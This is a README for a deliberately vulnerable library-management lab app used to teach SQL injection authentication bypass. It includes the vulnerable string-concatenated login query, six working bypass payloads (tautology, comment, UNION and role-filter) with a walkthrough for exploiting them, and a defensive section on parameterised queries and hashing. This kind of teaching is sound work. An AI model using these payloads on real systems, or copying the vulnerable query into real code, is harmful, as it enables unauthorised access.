# LibraryOS — SQL Injection Authentication Bypass Lab
### Red Team / Cybersecurity Education Project

> ⚠️ **ETHICAL NOTICE** — This application is **deliberately vulnerable**.
> It must be run **locally only**, used exclusively for **educational purposes**,
> and **never deployed** on a public network.

---

## Table of Contents

1. [Architecture Design](#1-architecture-design)
2. [Technical Description](#2-technical-description)
3. [Database Schema](#3-database-schema)
4. [Vulnerability Explanation](#4-vulnerability-explanation)
5. [Full A→Z Execution Guide](#5-full-az-execution-guide)
6. [Exploit Payloads](#6-exploit-payloads)
7. [Blue Team — Secure Fix](#7-blue-team--secure-fix)

---

## 1. Architecture Design

### 1.1 Folder Structure

```
sqli-lab/
├── docker-compose.yml          # Orchestrates web + db containers
├── README.md                   # This file
│
├── backend/                    # Flask application
│   ├── Dockerfile
│   ├── requirements.txt
│   ├── app.py                  # Main app — contains vulnerable login
│   └── templates/
│       ├── base.html           # Shared layout
│       ├── login.html          # Vulnerable login form + SQL debug panel
│       ├── dashboard.html      # Post-login landing page
│       ├── books.html          # Book catalogue
│       ├── loans.html          # Loan records
│       ├── members.html        # Admin-only member list
│       ├── secrets.html        # Super-admin-only sensitive data
│       └── cheatsheet.html     # Interactive exploit reference
│
└── db/
    └── init.sql                # Schema + seed data (auto-runs on first start)
```

### 1.2 Architecture Diagram

```
┌─────────────────────────────────────────────────────────────┐
│                    Docker Network (librarynet)               │
│                                                             │
│   ┌───────────────────────────────┐                         │
│   │      Flask Container          │                         │
│   │      (libraryos_web)          │                         │
│   │      port 5000                │                         │
│   │                               │                         │
│   │  ┌─────────────────────────┐  │                         │
│   │  │  app.py                 │  │                         │
│   │  │  ┌──────────────────┐   │  │                         │
│   │  │  │ /login  ← VULN   │   │  │                         │
│   │  │  │ /dashboard       │   │  │                         │
│   │  │  │ /books           │   │  │                         │
│   │  │  │ /loans           │   │  │                         │
│   │  │  │ /members  (admin)│   │  │                         │
│   │  │  │ /secrets (root)  │   │  │                         │
│   │  │  │ /cheatsheet      │   │  │                         │
│   │  │  └──────────────────┘   │  │                         │
│   │  └─────────────────────────┘  │                         │
│   └──────────────┬────────────────┘                         │
│                  │ MySQLdb (raw queries)                     │
│   ┌──────────────▼────────────────┐                         │
│   │      MySQL Container          │                         │
│   │      (libraryos_db)           │                         │
│   │      port 3306 (internal)     │                         │
│   │                               │                         │
│   │  Tables: members, books,      │                         │
│   │          loans                │                         │
│   └───────────────────────────────┘                         │
│                                                             │
└─────────────────────────────────────────────────────────────┘
         ▲
         │  HTTP  (browser)
    localhost:5000
```

### 1.3 Component Interaction

```
Browser → POST /login (username, password)
       → Flask concatenates inputs into raw SQL string
       → MySQL executes the raw string
       → Flask reads row[0]=id, row[1]=username, row[2]=role
       → Stores in session → redirect to /dashboard

Attacker injects SQL into username/password fields
       → breaks out of string literal
       → appends OR/UNION/comment clauses
       → MySQL returns unintended row or synthetic row
       → Flask grants session based on injected role
```

---

## 2. Technical Description

### 2.1 Technology Choices

| Component | Choice | Justification |
|-----------|--------|---------------|
| **Backend** | Python / Flask | Minimal boilerplate, clean raw-SQL path, excellent for showing the vulnerability without ORM abstraction. Django would hide the SQLi too many layers deep. |
| **Database** | MySQL 8.0 | Industry standard, best-known SQL injection target, supports `-- ` and `#` comments, UNION syntax. |
| **Containerisation** | Docker + Compose | Reproducible environment, one-command startup, isolated network. |
| **Frontend** | Jinja2 HTML templates | No JS framework needed — keeps focus on backend vulnerability. |
| **Auth** | Flask sessions (server-side cookie) | Simple to show how role is read from DB row and stored in session. |

### 2.2 Deliberate Design Decisions

- **Plain-text passwords in DB**: exposes both SQLi AND missing hashing, compounding the severity story.
- **Login page shows the raw SQL query**: makes the vulnerability visible during the demo without needing browser dev tools.
- **Three role levels**: provides a clear privilege escalation narrative (user → admin → super_admin).
- **`/cheatsheet` route**: self-contained exploit reference the presenter can display during the demo.

---

## 3. Database Schema

```sql
-- members: authentication target
members (
  id          INT AUTO_INCREMENT PK,
  username    VARCHAR(64) UNIQUE NOT NULL,
  password    VARCHAR(255) NOT NULL,    -- plain-text (intentional)
  email       VARCHAR(128) NOT NULL,
  role        ENUM('user','admin','super_admin'),
  created_at  DATETIME
)

-- books: library catalogue
books (
  id      INT AUTO_INCREMENT PK,
  title   VARCHAR(255),
  author  VARCHAR(128),
  genre   VARCHAR(64),
  year    SMALLINT,
  copies  TINYINT
)

-- loans: book loan records
loans (
  id          INT AUTO_INCREMENT PK,
  member_id   INT FK→members,
  book_id     INT FK→books,
  loaned_at   DATETIME,
  due_at      DATETIME,
  returned_at DATETIME NULL     -- NULL = still active
)
```

### Seed Users

| Username | Password | Role | Notes |
|----------|----------|------|-------|
| `alice` | `alice123` | user | Normal user — attack target for P1/P2 |
| `bob` | `bobpass` | user | Secondary user |
| `librarian` | `lib2024!` | admin | Admin — unlocks /members |
| `root_admin` | `R00t$uper!99` | super_admin | Root — unlocks /secrets |

---

## 4. Vulnerability Explanation

### 4.1 The Vulnerable Code (app.py ~line 58)

```python
# ⚠️ DELIBERATELY VULNERABLE — string concatenation
query = (
    "SELECT id, username, role FROM members "
    "WHERE username = '" + username + "' "
    "AND password = '" + password + "'"
)
cursor.execute(query)    # raw unsanitised string sent to MySQL
row = cursor.fetchone()
```

### 4.2 Why It Is Exploitable

1. **User-controlled input** is embedded verbatim into the SQL string.
2. **No sanitisation**: quotes, dashes, and SQL keywords are passed through unchanged.
3. **The database cannot distinguish** the injected SQL from the intended query.
4. **The app trusts the DB result unconditionally**: whatever row comes back, its `role` column becomes the session role.

### 4.3 CWE / OWASP Classification

- **CWE-89**: Improper Neutralization of Special Elements used in an SQL Command
- **OWASP Top 10 A03:2021**: Injection
- **CVSS Score** (hypothetical): 9.8 Critical (network, low complexity, no privileges required, high CIA impact)

---

## 5. Full A→Z Execution Guide

### Phase 0 — Prerequisites

Ensure the following are installed on your machine:

```bash
# Check Docker
docker --version
# Expected: Docker version 24.x.x or higher

# Check Docker Compose
docker compose version
# Expected: Docker Compose version v2.x.x

# Check Git (optional, for cloning)
git --version
```

If Docker is not installed: https://docs.docker.com/get-docker/

---

### Phase 1 — Get the Project

#### Option A — Clone from repo
```bash
git clone <your-repo-url> sqli-lab
cd sqli-lab
```

#### Option B — Use the files as delivered
```bash
cd sqli-lab   # navigate to the project root
```

Verify the structure:
```bash
ls -R
# Should show: docker-compose.yml, backend/, db/
```

---

### Phase 2 — Build and Launch

```bash
# From the sqli-lab/ root directory:
docker compose up --build
```

**What happens:**
1. Docker pulls `python:3.12-slim` and `mysql:8.0` images.
2. MySQL container starts, runs `db/init.sql` (creates schema + seed data).
3. Flask container builds, installs requirements, starts `app.py`.
4. Flask waits for MySQL to pass its healthcheck before connecting.

**Expected output (last lines):**
```
libraryos_db   | [Server] /usr/sbin/mysqld: ready for connections.
libraryos_web  |  * Running on http://0.0.0.0:5000
```

**This takes ~30–60 seconds on first run** (image download + DB init).

---

### Phase 3 — Verify the Application

Open your browser:

```
http://localhost:5000
```

You should see the **LibraryOS login page** with:
- A login form (left)
- Seed credentials table (right)
- Vulnerable SQL template display (right)

**Test legitimate login:**
- Username: `alice` | Password: `alice123` → Should succeed as `user`
- Click Logout
- Username: `librarian` | Password: `lib2024!` → Should succeed as `admin`
- Click Logout

---

### Phase 4 — Explore the Application

| Route | Access | Description |
|-------|--------|-------------|
| `/login` | public | Vulnerable login form |
| `/dashboard` | any auth | Welcome page + session info |
| `/books` | any auth | Book catalogue |
| `/loans` | any auth | Loans (users see own; admin sees all) |
| `/members` | admin+ | All member accounts |
| `/secrets` | super_admin | Simulated sensitive data dump |
| `/cheatsheet` | public | Full exploit reference |

---

### Phase 5 — Exploit the Vulnerability

Open the browser at `http://localhost:5000/login`.

#### Attack 1 — ANY User (tautology)

```
Username: ' OR '1'='1
Password: ' OR '1'='1
```

Observe: SQL panel shows the injected query. Login succeeds as `alice` (first DB row).

**The injected query:**
```sql
SELECT id, username, role FROM members
WHERE username = '' OR '1'='1'
  AND password = '' OR '1'='1'
```

---

#### Attack 2 — Bypass as known user (comment)

```
Username: alice'-- 
Password: wrongpassword
```

Note: There is a **space after** the two dashes. This is required by MySQL.

Observe: Password check is commented out. Login succeeds as alice with wrong password.

**The injected query:**
```sql
SELECT id, username, role FROM members
WHERE username = 'alice'--  ' AND password = 'wrongpassword'
--                           ^^^^^^^^^^^^^^^^^^^^ COMMENTED OUT
```

---

#### Attack 3 — Escalate to Admin

```
Username: librarian'-- 
Password: (anything)
```

Observe: Logged in as `librarian` with `admin` role. The `/members` menu item appears. Navigate to `/members` — full member list is visible.

---

#### Attack 4 — Escalate to Super-Admin (UNION)

```
Username: ' UNION SELECT 99,'hacker','super_admin'-- 
Password: (anything)
```

Observe: The session shows `user: hacker`, `role: super_admin`. Navigate to `/secrets` — the simulated credential dump is accessible. **Note**: this user does not exist in the database — the session is entirely fabricated.

---

#### Attack 5 — Super-Admin via Hash Comment

```
Username: root_admin'#
Password: (anything)
```

Observe: Logs in as `root_admin` with `super_admin` role directly.

---

#### Attack 6 — Role-Based Targeting (without knowing username)

```
Username: ' OR role='super_admin'-- 
Password: (anything)
```

Observe: Returns first super_admin row without knowing the username.

---

### Phase 6 — Demonstrate Impact

Navigate to each of these to show privilege escalation impact:

1. **`/dashboard`** → shows session role in the UI
2. **`/members`** → visible only after admin bypass (P3/P6)
3. **`/secrets`** → visible only after super_admin bypass (P4/P5) — shows complete member dump
4. **`/cheatsheet`** → full payload reference (great for a live demo)

---

### Phase 7 — Show the Fix

In `backend/app.py`, replace the vulnerable block with:

```python
# SECURE VERSION — parameterised query
query = (
    "SELECT id, username, role FROM members "
    "WHERE username = %s AND password = %s"
)
cursor.execute(query, (username, password))
```

Then restart:
```bash
docker compose restart web
```

Test that all injection payloads now fail with "Invalid credentials."

---

### Phase 8 — Stop the Lab

```bash
# Stop containers (preserves DB volume)
docker compose down

# Stop AND delete all data (clean reset)
docker compose down -v
```

---

## 6. Exploit Payloads

### Quick Reference Table

| # | Username field | Password | Target | Technique |
|---|---------------|----------|--------|-----------|
| P1 | `' OR '1'='1` | `' OR '1'='1` | first user | Tautology |
| P2 | `alice'-- ` | (any) | alice (user) | Comment |
| P3 | `librarian'-- ` | (any) | librarian (admin) | Comment |
| P4 | `' UNION SELECT 99,'hacker','super_admin'-- ` | (any) | synthetic super_admin | UNION |
| P5 | `root_admin'#` | (any) | root_admin (super_admin) | Hash comment |
| P6 | `' OR role='super_admin'-- ` | (any) | first super_admin | Role filter |

### How Each Payload Works

**P1 — Tautology**: `' OR '1'='1` closes the string and adds a condition that is always true. The WHERE clause is universally satisfied.

**P2/P3/P5 — Comment Injection**: `'-- ` or `'#` closes the string and comments out the rest of the query, including the password check.

**P4 — UNION Injection**: `UNION SELECT` appends a completely fabricated row to the result set. The app reads this row's columns as if they came from the database.

**P6 — Role Filter**: Instead of targeting a specific user, filters by `role` column directly.

---

## 7. Blue Team — Secure Fix

### Fix 1 — Parameterised Queries (Critical)

```python
# VULNERABLE (before):
query = "SELECT id, username, role FROM members WHERE username = '" + username + "' AND password = '" + password + "'"
cursor.execute(query)

# SECURE (after):
query = "SELECT id, username, role FROM members WHERE username = %s AND password = %s"
cursor.execute(query, (username, password))
```

**Why it works**: The database driver sends the query template and the values separately over the wire. MySQL compiles the query first, then substitutes values. Values can never alter the query's structure.

### Fix 2 — Password Hashing

```python
import bcrypt

# At registration:
hashed = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt())
# Store hashed in DB

# At login (fetch user by username only — then verify hash):
query = "SELECT id, username, role, password FROM members WHERE username = %s"
cursor.execute(query, (username,))
row = cursor.fetchone()
if row and bcrypt.checkpw(password.encode('utf-8'), row[3].encode('utf-8')):
    # grant session
```

### Fix 3 — Input Validation

```python
import re

def validate_username(username):
    return bool(re.match(r'^[a-zA-Z0-9_]{3,64}$', username))

if not validate_username(username):
    return render_template('login.html', error="Invalid input format"), 400
```

### Fix 4 — Least Privilege DB Account

```sql
-- Create a DB user with only SELECT on members
CREATE USER 'appuser'@'%' IDENTIFIED BY 'strongpassword';
GRANT SELECT ON librarydb.members TO 'appuser'@'%';
-- Even with SQLi, attacker cannot DROP tables or SELECT other DBs
```

### Defence-in-Depth Summary

| Layer | Mitigation | Eliminates |
|-------|-----------|------------|
| Query | Parameterisation | All SQLi payloads |
| Password | bcrypt hashing | Credential extraction via UNION |
| Input | Regex validation | Many payload formats |
| DB account | Least privilege | Lateral movement after SQLi |
| App | Rate limiting | Brute force + blind SQLi |
| Infra | WAF rules | Known SQLi signatures |

---

### Key Talking Points

- "The vulnerability is **one line of code** — string concatenation instead of parameterisation."
- "The attacker doesn't need to know any password to log in as anyone, including root."
- "With the UNION payload, the attacker creates an identity that doesn't exist in the database."
- "The fix is also one line — but requires understanding WHY parameterisation works."
- "Plain-text passwords compound the issue — even without SQLi, a DB dump exposes everything."

---

*LibraryOS v1.0 — Red Team Education Lab*
*OWASP A03:2021 · CWE-89 · For educational use only*